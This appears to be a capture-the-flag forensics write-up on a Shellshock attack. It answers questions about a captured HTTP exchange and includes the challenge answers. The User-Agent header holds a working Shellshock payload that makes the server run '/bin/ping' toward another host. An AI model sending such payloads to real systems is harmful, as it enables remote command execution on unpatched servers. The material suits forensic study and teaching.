> # Shellshock Attack

# Summary

## Q1. What is the server operating system?
Find HTTP packet and follow HTTP stream, you will the response from the web server.<br>
```
GET /exploitable.cgi HTTP/1.1
User-Agent: () { :;}; /bin/ping -c1 10.246.50.2
Host: 10.246.50.6
Accept: */*

HTTP/1.1 500 Internal Server Error
Date: Thu, 25 Sep 2014 17:27:35 GMT
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 615
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
</head><body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error or
misconfiguration and was unable to complete
your request.</p>
<p>Please contact the server administrator,
 [no address given] and inform them of the time the error occurred,
and anything you might have done that may have
caused the error.</p>
<p>More information about this error may be available
in the server error log.</p>
<hr>
<address>Apache/2.2.22 (Ubuntu) Server at 10.246.50.6 Port 80</address>
</body></html>
```
**Answer:** Ubuntu

## Q2. What is the application server and version running on the target system?
From the response above, you will the version application running on the target.<br>
**Answer:** Apache/2.2.22

## Q3. What is the exact command that the attacker wants to run on the target server?
At `User-Agent`, you will see the command attacker wants to run on the target.<br>
**Answer:** /bin/ping -c1 10.246.50.2
